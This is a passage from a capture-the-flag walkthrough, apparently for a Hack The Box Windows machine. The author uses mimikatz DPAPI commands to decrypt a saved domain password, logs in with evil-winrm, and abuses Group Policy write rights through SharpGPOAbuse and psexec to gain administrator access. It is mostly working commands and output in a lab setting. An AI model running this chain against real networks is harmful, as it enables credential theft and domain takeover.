</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Directory: C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Mode                 LastWriteTime         Length Name                                                                 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ----                 -------------         ------ ----                                                                 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  -a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E                                     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  -a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4                                     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  -a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF7
</span></span></code></pre></div><p>I use dpapi feature via mimikatz:</p>
<p>DPAPI (Data Protection API) is an API used for data protection and encryption operations in the Microsoft Windows operating system.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\XXXXXXXXXXX
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  **BLOB**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwVersion          : 00000001 - 1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwMasterKeyVersion : 00000001 - 1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwFlags            : 20000000 - 536870912 (system ; )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwDescriptionLen   : 0000003a - 58
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    szDescription      : Enterprise Credential Data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    algCrypt           : 00006603 - 26115 (CALG_3DES)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwAlgCryptLen      : 000000c0 - 192
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwSaltLen          : 00000010 - 16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwHmacKeyLen       : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbHmackKey         : 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    algHash            : 00008004 - 32772 (CALG_SHA1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwAlgHashLen       : 000000a0 - 160
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwHmac2KeyLen      : 00000010 - 16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwDataLen          : 000000c0 - 192
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwSignLen          : 00000014 - 20
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
</span></span></code></pre></div><p>I know I might need the guidMasterKey so I&rsquo;m keeping it temporarily.</p>
<p>Now I&rsquo;ll enumarate this directory and got a SID number:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  PS C:\Users\PPotts\appdata\roaming\microsoft\protect&gt; dir
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Directory: C:\Users\PPotts\appdata\roaming\microsoft\protect
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Mode                 LastWriteTime         Length Name                                                                 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ----                 -------------         ------ ----                                                                 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  d---s-         1/17/2024   3:43 PM                S-1-5-21-1199398058-4196589450-691661856-1107
</span></span></code></pre></div><p>Change SID and guidMasterKey to your own:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  dpapi::masterkey /in:C:\Users\PPotts\appdata\roaming\microsoft\protect\\ /rpc
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  mimikatz # dpapi::masterkey /in:C:\Users\PPotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  **MASTERKEYS**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwVersion          : 00000002 - 2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    szGuid             : {191d3f9d-7959-4b4d-a520-a444853c47eb}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwFlags            : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwMasterKeyLen     : 00000088 - 136
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwBackupKeyLen     : 00000068 - 104
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwCredHistLen      : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwDomainKeyLen     : 00000174 - 372
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [masterkey]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    **MASTERKEY**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      dwVersion        : 00000002 - 2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      salt             : c521daa0857ee4fa6e4246266081e94c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      rounds           : 00004650 - 18000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      algHash          : 00008009 - 32777 (CALG_HMAC)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      algCrypt         : 00006603 - 26115 (CALG_3DES)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [backupkey]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    **MASTERKEY**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      dwVersion        : 00000002 - 2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      salt             : a2741b13d7261697be4241ebbe05098a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      rounds           : 00004650 - 18000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      algHash          : 00008009 - 32777 (CALG_HMAC)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      algCrypt         : 00006603 - 26115 (CALG_3DES)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [domainkey]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    **DOMAINKEY**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      dwVersion        : 00000002 - 2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      dwSecretLen      : 00000100 - 256
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      dwAccesscheckLen : 00000058 - 88
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      guidMasterKey    : {e523832a-e126-4d6e-ac04-ed10da72b32f}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [backupkey] without DPAPI_SYSTEM: 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    key : 4d1b2c18baba7442e79d33cc771bf54027ae2500e08da3ecfccf91303bd471b6
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sha1: eeb787c4259e3c8b8408201ee5e54fc29fad22b2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [domainkey] with RPC
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [DC] &#39;office.htb&#39; will be the domain
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [DC] &#39;DC.office.htb&#39; will be the DC server
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
</span></span></code></pre></div><p>After using the this command I see the password of HHogan</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\XXXXXXXXXXXXX /guidMasterkey::
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /191d3f9d-7959-4b4d-a520-a444853c47eb::87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  **BLOB**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwVersion          : 00000001 - 1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwMasterKeyVersion : 00000001 - 1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwFlags            : 20000000 - 536870912 (system ; )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwDescriptionLen   : 0000003a - 58
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    szDescription      : Enterprise Credential Data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    algCrypt           : 00006603 - 26115 (CALG_3DES)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwAlgCryptLen      : 000000c0 - 192
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwSaltLen          : 00000010 - 16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwHmacKeyLen       : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbHmackKey         : 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    algHash            : 00008004 - 32772 (CALG_SHA1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwAlgHashLen       : 000000a0 - 160
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwHmac2KeyLen      : 00000010 - 16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwDataLen          : 000000c0 - 192
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwSignLen          : 00000014 - 20
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Decrypting Credential:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  * volatile cache: GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77;Key:available
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  **CREDENTIAL**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    credFlags      : 00000030 - 48
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    credSize       : 000000be - 190
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    credUnk0       : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Type           : 00000002 - 2 - domain_password
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Flags          : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    LastWritten    : 5/9/2023 11:03:21 PM
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    unkFlagsOrSize : 00000018 - 24
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Persist        : 00000003 - 3 - enterprise
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    AttributeCount : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    unk0           : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    unk1           : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    TargetName     : Domain:interactive=OFFICE\HHogan
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    UnkData        : (null)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Comment        : (null)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    TargetAlias    : (null)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    UserName       : OFFICE\HHogan
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    CredentialBlob : H4ppyFtW183#
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Attributes     : 
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  evil-winrm -u &#34;hhogan&#34; -p &#34;H4ppyFtW183#&#34; -i 10.10.11.3     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Evil-WinRM shell v3.5
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  *Evil-WinRM* PS C:\Users\HHogan\Documents&gt;
</span></span></code></pre></div><h3 id="shell-as-system"><strong>Shell as system</strong></h3>
<p>I see that HHogan is in the GPO Managers group and can write to the default domain group policy. This ability allows an attacker to perform a wide variety of attacks, they can execute commands via scheduled tasks, disable or modify system services, elevate privileges and more.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; whoami /groups
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GROUP INFORMATION
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Group Name                                  Type             SID                                           Attributes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>=========================================== ================ ============================================= ==================================================
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OFFICE\GPO Managers                         Group            S-1-5-21-1199398058-4196589450-691661856-1117 Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; Get-GPO -All | Select-Object -ExpandProperty DisplayName
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Windows Firewall GPO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Default Domain Policy
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Default Active Directory Settings GPO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Default Domain Controllers Policy
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Windows Update GPO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Windows Update Domain Policy
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Software Installation GPO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Password Policy 
</span></span></code></pre></div><p>Now I add it to the computer as a local administrator via GPO.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*Evil-WinRM* PS C:\programdata&gt; ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName &#34;Default Domain Policy&#34;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Domain = office.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Domain Controller = DC.office.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] SID Value of HHogan = S-1-5-21-1199398058-4196589450-691661856-1108
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] GUID of &#34;Default Domain Policy&#34; is: {31B2F340-016D-11D2-945F-00C04FB984F9}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] File exists: \\office.htb\SysVol\office.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] The GPO does not specify any group memberships.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] versionNumber attribute changed successfully
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] The version number in GPT.ini was increased successfully.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Done!
</span></span></code></pre></div><p>I update windows group policy settings:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*Evil-WinRM* PS C:\programdata&gt; gpupdate /force
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Updating policy...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Computer Policy update has completed successfully.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User Policy update has completed successfully.
</span></span></code></pre></div><p>I can easily see that HHogan are in the administrator group.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*Evil-WinRM* PS C:\programdata&gt; net localgroup Administrators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Alias name     Administrators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Comment        Administrators have complete and unrestricted access to the computer/domain
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Members
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Administrator
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HHogan
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The command completed successfully.
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>impacket<span style="color:#ff79c6">-</span>psexec<span style="color:#ff79c6">.</span>py HHogan:H4ppyFtW183<span style="color:#6272a4">#@10.10.11.3   </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Impacket v0<span style="color:#ff79c6">.</span><span style="color:#bd93f9">12.0</span><span style="color:#ff79c6">.</span>dev1<span style="color:#ff79c6">+</span><span style="color:#bd93f9">20230907.33311</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">3</span>f645107 <span style="color:#ff79c6">-</span> Copyright <span style="color:#bd93f9">2023</span> Fortra
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Requesting shares on <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">11.3</span><span style="color:#ff79c6">.....</span>
